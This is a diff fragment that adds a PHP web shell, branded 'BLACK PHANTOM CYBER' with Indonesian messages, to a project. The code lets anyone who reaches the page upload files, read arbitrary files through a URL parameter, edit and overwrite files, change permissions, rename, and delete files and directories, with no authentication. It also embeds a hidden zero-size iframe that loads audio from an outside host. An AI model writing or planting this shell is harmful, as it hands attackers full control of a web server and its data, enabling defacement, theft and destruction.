+if($pat == '' && $id == 0){
+$a = true;
+echo '<a href="?path=/">/</a>';
+continue;
+}
+if($pat == '') continue;
+echo '<a href="?path=';
+for($i=0;$i<=$id;$i++){
+echo "$paths[$i]";
+if($i != $id) echo "/";
+}
+echo '">'.$pat.'</a>/';
+}
+echo '</td></tr><tr><td>';
+if(isset($_FILES['file'])){
+if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){
+echo '<font color="#5ddcfc">Upload File Berhasil</font><br />';
+}else{
+echo '<font color="#9435dd">Upload File Gagal</font><br/>';
+}
+}
+echo '<form enctype="multipart/form-data" method="POST">
+<font color="#5ddcfc">File Upload :</font><input type="file"  name="file" /><input type="submit" value="upload" />
+</form>
+</td></tr>';
+if(isset($_GET['filesrc'])){
+echo "<tr><td>Current File : ";
+echo $_GET['filesrc'];
+echo '</tr></td></table><br />';
+echo(' <center><textarea style="width: 700px;height: 300px;" readonly> '.htmlspecialchars(file_get_contents($_GET['filesrc'])).'</textarea></center>');
+}elseif(isset($_GET['option']) && $_POST['opt'] != 'delete'){
+echo '</table><br /><center>'.$_POST['path'].'<br /><br />';
+if($_POST['opt'] == 'chmod'){
+if(isset($_POST['perm'])){
+if(chmod($_POST['path'],$_POST['perm'])){
+echo '<font color="#5ddcfc">Change Permission Berhasil</font><br/>';
+}else{
+echo '<font color="#9435dd">Change Permission Gagal</font><br />';
+}
+}
+echo '<form method="POST">
+Permission : <input name="perm" type="text" size="4" value="'.substr(sprintf('%o', fileperms($_POST['path'])), -4).'" />
+<input type="hidden" name="path" value="'.$_POST['path'].'">
+<input type="hidden" name="opt" value="chmod">
+<input type="submit" value="Go" />
+</form>';
+}elseif($_POST['opt'] == 'rename'){
+if(isset($_POST['newname'])){
+if(rename($_POST['path'],$path.'/'.$_POST['newname'])){
+echo '<font color="#5ddcfc">Berhasil Mengganti Nama</font><br/>';
+}else{
+echo '<font color="#9435dd">Gagal Mengganti Nama</font><br />';
+}
+$_POST['name'] = $_POST['newname'];
+}
+echo '<form method="POST">
+Nama Baru : <input name="newname" type="text" size="20" value="'.$_POST['name'].'" />
+<input type="hidden" name="path" value="'.$_POST['path'].'">
+<input type="hidden" name="opt" value="rename">
+<input type="submit" value="Simpan" />
+</form>';
+}elseif($_POST['opt'] == 'edit'){
+if(isset($_POST['src'])){
+$fp = fopen($_POST['path'],'w');
+if(fwrite($fp,$_POST['src'])){
+echo '<font color="#5ddcfc">Berhasil Edit File</font><br/>';
+}else{
+echo '<font color="#9435dd">Gagal Edit File</font><br/>';
+}
+fclose($fp);
+}
+echo '<form method="POST">
+<center><textarea style="width: 700px;height: 300px;" name="src"> '.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea></center><br />
+<input type="hidden" name="path" value="'.$_POST['path'].'">
+<input type="hidden" name="opt" value="edit">
+<input type="submit" value="Simpan" />
+</form>';
+}
+echo '</center>';
+}else{
+echo '</table><br/><center>';
+if(isset($_GET['option']) && $_POST['opt'] == 'delete'){
+if($_POST['type'] == 'dir'){
+if(rmdir($_POST['path'])){
+echo '<font color="#5ddcfc">Directory Berhasil Terhapus</font><br/>';
+}else{
+echo '<font color="#9435dd">Directory Gagal Terhapus                                                                                                                                                                                                                                                                                             </font><br/>';
+}
+}elseif($_POST['type'] == 'file'){
+if(unlink($_POST['path'])){
+echo '<font color="#5ddcfc">File Berhasil Terhapus</font><br/>';
+}else{
+echo '<font color="#9435dd">File Gagal Dihapus</font><br/>';
+}
+}
+}
+echo '</center>';
+$scandir = scandir($path);
+echo '<div id="content"><table width="700" border="0" cellpadding="4" cellspacing="1" align="center">
+<tr class="first">
+<td><center>Name</peller></center></td>
+<td><center>Size</peller></center></td>
+<td><center>Permission</peller></center></td>
+<td><center>Modify</peller></center></td>
+</tr>';
+
+foreach($scandir as $dir){
+if(!is_dir($path.'/'.$dir) || $dir == '.' || $dir == '..') continue;
+echo '<tr>
+<td><a href="?path='.$path.'/'.$dir.'">'.$dir.'</a></td>
+<td><center>----</center></td>
+<td><center>';
+if(is_writable($path.'/'.$dir)) echo '<font color=" #00edff">';
+elseif(!is_readable($path.'/'.$dir)) echo '<font color="red">';
+echo perms($path.'/'.$dir);
+if(is_writable($path.'/'.$dir) || !is_readable($path.'/'.$dir)) echo '</font>';
+
+echo '</center></td>
+<td><center><form method="POST" action="?option&path='.$path.'">
+<select name="opt">
+<option value="">Select</option>
+<option value="delete">Delete</option>
+<option value="chmod">Chmod</option>
+<option value="rename">Rename</option>
+</select>
+<input type="hidden" name="type" value="dir">
+<input type="hidden" name="name" value="'.$dir.'">
+<input type="hidden" name="path" value="'.$path.'/'.$dir.'">
+<input type="submit" value=">">
+</form></center></td>
+</tr>';
+}
+echo '<tr class="first"><td></td><td></td><td></td><td></td></tr>';
+foreach($scandir as $file){
+if(!is_file($path.'/'.$file)) continue;
+$size = filesize($path.'/'.$file)/1024;
+$size = round($size,3);
+if($size >= 1024){
+$size = round($size/1024,2).' MB';
+}else{
+$size = $size.' KB';
+}
+
+echo '<tr>
+<td><a href="?filesrc='.$path.'/'.$file.'&path='.$path.'">'.$file.'</a></td>
+<td><center>'.$size.'</center></td>
+<td><center>';
+if(is_writable($path.'/'.$file)) echo '<font color=" #00edff">';
+elseif(!is_readable($path.'/'.$file)) echo '<font color="red">';
+echo perms($path.'/'.$file);
+if(is_writable($path.'/'.$file) || !is_readable($path.'/'.$file)) echo '</font>';
+echo '</center></td>
+<td><center><form method="POST" action="?option&path='.$path.'">
+<select name="opt">
+<option value="">Select</option>
+<option value="delete">Delete</option>
+<option value="chmod">Chmod</option>
+<option value="rename">Rename</option>
+<option value="edit">Edit</option>
+</select>
+<input type="hidden" name="type" value="file">
+<input type="hidden" name="name" value="'.$file.'">
+<input type="hidden" name="path" value="'.$path.'/'.$file.'">
+<input type="submit" value=">">
+</form></center></td>
+</tr>';
+}
+echo '</table>
+</div>';
+}
+echo '<center><br/> </center>
+<center><font color="red" face="Courgette" size="4">Copyright &copy; 2019 <font color="#9435dd">BLACK PHANTOM CYBER</font></center>
+<body>
+  
+  <iframe width="0" height="0" src="https://k.top4top.net/m_12407hbmd0.mp3" frameborder="0" allowfullscreen></iframe>
+  
+</body>
+</html>';
+function perms($file){
+$perms = fileperms($file);
+
+if (($perms & 0xC000) == 0xC000) {
+// Socket
+$info = 's';
+} elseif (($perms & 0xA000) == 0xA000) {
+// Symbolic Link
+$info = 'l';
+} elseif (($perms & 0x8000) == 0x8000) {
+// Regular
+$info = '-';
+} elseif (($perms & 0x6000) == 0x6000) {
+// Block special
+$info = 'b';
+} elseif (($perms & 0x4000) == 0x4000) {
+// Directory
+$info = 'd';
+} elseif (($perms & 0x2000) == 0x2000) {
+// Character special
+$info = 'c';
+} elseif (($perms & 0x1000) == 0x1000) {
+// FIFO pipe
+$info = 'p';
+} else {
+// Unknown
+$info = 'u';
+}
+
+// Owner
+$info .= (($perms & 0x0100) ? 'r' : '-');
+$info .= (($perms & 0x0080) ? 'w' : '-');
+$info .= (($perms & 0x0040) ?
+(($perms & 0x0800) ? 's' : 'x' ) :
+(($perms & 0x0800) ? 'S' : '-'));
+
+// Group
+$info .= (($perms & 0x0020) ? 'r' : '-');
+$info .= (($perms & 0x0010) ? 'w' : '-');
+$info .= (($perms & 0x0008) ?
+(($perms & 0x0400) ? 's' : 'x' ) :
+(($perms & 0x0400) ? 'S' : '-'));
+
+// World
+$info .= (($perms & 0x0004) ? 'r' : '-');
+$info .= (($perms & 0x0002) ? 'w' : '-');
+$info .= (($perms & 0x0001) ?
+(($perms & 0x0200) ? 't' : 'x' ) :
+(($perms & 0x0200) ? 'T' : '-'));
+
+return $info;
+}
+?>
